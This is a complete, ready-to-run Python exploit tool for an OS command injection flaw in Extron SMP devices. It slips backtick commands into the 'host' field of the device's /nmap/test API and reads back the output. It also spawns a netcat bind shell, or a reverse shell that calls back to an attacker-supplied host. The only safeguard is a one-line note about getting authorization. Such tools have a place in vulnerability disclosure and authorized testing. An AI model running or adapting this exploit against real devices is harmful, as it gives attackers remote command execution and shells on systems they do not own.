# Extron SMP OS Command Injection
# By Ryan Roth @f1rstm4tter
# www.layer8security.com

import json
import time
import base64
import argparse
import ipaddress
import logging
import requests

# Constants
API_BASE_URL = "/api/swis/resources"
NMAP_TEST_URI = "/nmap/test"

# Set up logging with custom levels


def setup_logging(verbose=False, log_file=None):
    """Set up logging to console and optionally to a file."""
    logger = logging.getLogger()
    logger.setLevel(logging.DEBUG if verbose else logging.INFO)

    # Create console handler
    ch = logging.StreamHandler()
    ch.setLevel(logging.DEBUG if verbose else logging.INFO)
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
    ch.setFormatter(formatter)
    logger.addHandler(ch)

    # If log_file is provided, set up file logging
    if log_file:
        fh = logging.FileHandler(log_file)
        fh.setLevel(logging.DEBUG if verbose else logging.INFO)
        fh.setFormatter(formatter)
        logger.addHandler(fh)

# Utility Functions


def encode_credentials(username, password):
    """Base64 encode the username and password."""
    if password:
        credentials = f"{username}:{password}"
        return base64.b64encode(credentials.encode('utf-8')).decode('utf-8')
    return None


def build_request_headers(credentials):
    """Build the HTTP headers for the request."""
    headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
    if credentials:
        headers["Authorization"] = f"Basic {credentials}"
    return headers


def construct_url(rhost, rport, endpoint):
    """Construct the URL based on protocol and endpoint."""
    protocol = "https" if rport == "443" else "http"
    return f"{protocol}://{rhost}{endpoint}"


def validate_ip(ip):
    """Validate if the provided string is a valid IP address."""
    try:
        ipaddress.ip_address(ip)
        return ip
    except ValueError as e:
        raise argparse.ArgumentTypeError(f"Invalid IP address: {ip}") from e


def validate_port(port):
    """Validate the port number ensuring it is a string representing a valid port (1-65535)."""
    if not port.isdigit() or not (1 <= int(port) <= 65535):
        raise argparse.ArgumentTypeError(
            f"Port number {port} must be an integer between 1 and 65535.")
    return port

# Core Function to send payloads


def send_payload(rhost, rport, payload, credentials=None):
    """Sends a command or shell payload to the target system."""
    url = construct_url(rhost, rport, API_BASE_URL)
    headers = build_request_headers(credentials)

    data = [
        {
            "uri": NMAP_TEST_URI,
            "value": {
                "host": f"127.0.0.1 `{payload}`",
                "port": "80"
            }
        }
    ]

    try:
        response = requests.put(url, headers=headers,
                                data=json.dumps(data), timeout=10)
        response.raise_for_status()  # Raise an error for bad responses
        logging.info("Payload sent successfully.")
        return response
    except requests.exceptions.HTTPError as http_err:
        # Log specific HTTP error
        logging.error("HTTP error occurred: %s - Response: %s",
                      http_err, response.text)
    except requests.exceptions.RequestException as e:
        logging.error("Error sending the request: %s", e)
    return None

# Command Injection Functions


def inject_command(rhost, rport, cmd, credentials=None):
    """Injects an arbitrary command."""
    logging.info("Injecting command: %s", cmd)
    response = send_payload(rhost, rport, cmd, credentials)

    # Log the outcome of sending the payload
    if response is None:
        logging.error("Failed to send payload. Response is None.")
        return

    # Log the raw response payload for troubleshooting
    logging.debug("Raw response payload: %s", response.text)

    try:
        response_json = response.json()
    except json.JSONDecodeError as e:
        logging.error("Failed to parse JSON response: %s - Raw Response: %s",
                      e, response.text)
        return

    # Ensure response is a list and contains expected structure
    if not isinstance(response_json, list) or not response_json:
        logging.error(
            "Unexpected response structure: expected a non-empty list.")
        logging.debug("Full response: %s", response_json)
        return

    result = response_json[0].get("result", {})
    injection_id = result.get("id")

    if not injection_id:
        logging.error("Failed to obtain results id.")
        return

    logging.info("Obtained injection result id: %s", injection_id)
    logging.info("Pausing 5 seconds to await result.")
    time.sleep(5)

    # Log the command being checked for results
    logging.info(
        "Retrieving results for command: %s with injection ID: %s", cmd, injection_id)
    get_injection_result(rhost, rport, injection_id, credentials)


def get_injection_result(rhost, rport, injection_id, credentials=None):
    """Gets the result of an arbitrary command injection."""
    url = construct_url(
        rhost, rport, f"{API_BASE_URL}?&uri=%2Fnmap%2Ftest%3Fid%3D{injection_id}")
    headers = build_request_headers(credentials)
    try:
        response = requests.get(url, headers=headers, timeout=10)
        # response.raise_for_status()  # Raise an error for bad responses

        # Log the raw response payload for troubleshooting
        logging.debug("Raw response payload: %s", response.text)

        # Attempt to parse the JSON response
        try:
            results_data = json.dumps(response.json(), indent=4)
            logging.info("Command injection results for id %s", injection_id)
            print(results_data)
            return True
        except json.JSONDecodeError:
            logging.error("Error parsing JSON response.")
            return False
    except requests.exceptions.HTTPError as http_err:
        logging.error("HTTP error occurred: %s - Status Code: %s - Response: %s",
                      http_err, response.status_code, response.text)
        return False
    except requests.exceptions.RequestException as e:
        logging.error("Error obtaining injection results: %s", e)
        return False

# Shell Spawning Function


def spawn_shell(shell_type, rhost, rport, lhost=None, lport=None, credentials=None):
    """Handles the spawning of bind or reverse shells."""
    if shell_type == "bind":
        logging.info("Spawning a bind shell on %s with port %s", rhost, lport)
        if lport is None:
            logging.error("Target bind port is required for bind shell.")
            return
        payload = f"nc -nvlp {lport} -e /bin/sh"
    elif shell_type == "reverse":
        logging.info(
            "Spawning a reverse shell from %s to %s on port %s", rhost, lhost, lport)
        if lhost is None or lport is None:
            logging.error(
                "Attacker host and port are required for reverse shell.")
            return
        payload = f"nc -nv {lhost} {lport} -e /bin/bash"
    else:
        logging.error("Unknown shell type.")
        return

    send_payload(rhost, rport, payload, credentials)

# Main Functions


def setup_subparsers(parser):
    """Sets up the subparsers for command injection and shell spawning."""
    # Define the helper function to add common arguments
    def add_common_arguments(subparser):
        subparser.add_argument('rhost', type=validate_ip,
                               help="target IP address")
        subparser.add_argument(
            'rport', choices=['80', '443'], help="target port (80 or 443)")
        subparser.add_argument('--username', default='admin',
                               help="username for authentication [default: admin]")
        subparser.add_argument(
            '--password', help="password for authentication")

    # Defining the subcommands
    subparsers = parser.add_subparsers(
        dest='action', required=True, help="choose a command to execute")

    # Command injection subparser
    command_parser = subparsers.add_parser(
        'command', help='execute arbitrary commands', description='Inject and execute arbitrary commands on the target system.')
    command_parser.add_argument('cmd', type=str, help="command to execute")
    add_common_arguments(command_parser)

    # Bind shell subparser
    bind_parser = subparsers.add_parser(
        'bind', help='spawn a bind shell on the target', description='Establish a bind shell on the target system, listening for connections on the specified port.')
    bind_parser.add_argument(
        'lport', type=validate_port, help="target bind port")
    add_common_arguments(bind_parser)

    # Reverse shell subparser
    reverse_parser = subparsers.add_parser(
        'reverse', help='spawn a reverse shell from the target', description='Create a reverse shell that connects back to the specified attacker host and port.')
    reverse_parser.add_argument(
        'lhost', type=validate_ip, help="attacker host listening IP address")
    reverse_parser.add_argument(
        'lport', type=validate_port, help="attacker host Listening port")
    add_common_arguments(reverse_parser)


def main():
    """Main function to handle CLI arguments and execute appropriate actions."""

    # What would we be without some ascii?
    banner = r"""
   ____     __                  ____       _         __ 
  / __/_ __/ /________  ___    /  _/__    (_)__ ____/ /_
 / _/ \ \ / __/ __/ _ \/ _ \  _/ // _ \  / / -_) __/ __/
/___//_\_\\__/_/  \___/_//_/ /___/_//_/_/ /\__/\__/\__/ 
                                     |___/          
                                                    @f1rstm4tter

    """
    print(banner)

    parser = argparse.ArgumentParser(
        description="A tool to exploit OS command injection vulnerabilities in Extron SMP devices.",
        epilog="note: ensure you have authorization before testing devices. unauthorized access is illegal."
    )
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='enable verbose logging')
    parser.add_argument('--log-file', type=str,
                        help='specify a file to write logs to')

    # Setup subparsers
    setup_subparsers(parser)

    # Parse arguments
    args = parser.parse_args()

    # Setup logging based on verbosity flag and log file
    setup_logging(args.verbose, args.log_file)

    # Execute actions based on parsed arguments
    credentials = encode_credentials(
        args.username, args.password) if args.password else None

    if args.action == 'command':
        inject_command(args.rhost, args.rport, args.cmd, credentials)
    elif args.action == 'bind':
        spawn_shell('bind', args.rhost, args.rport,
                    lport=args.lport, credentials=credentials)
    elif args.action == 'reverse':
        spawn_shell('reverse', args.rhost, args.rport,
                    lhost=args.lhost, lport=args.lport, credentials=credentials)


if __name__ == '__main__':
    main()
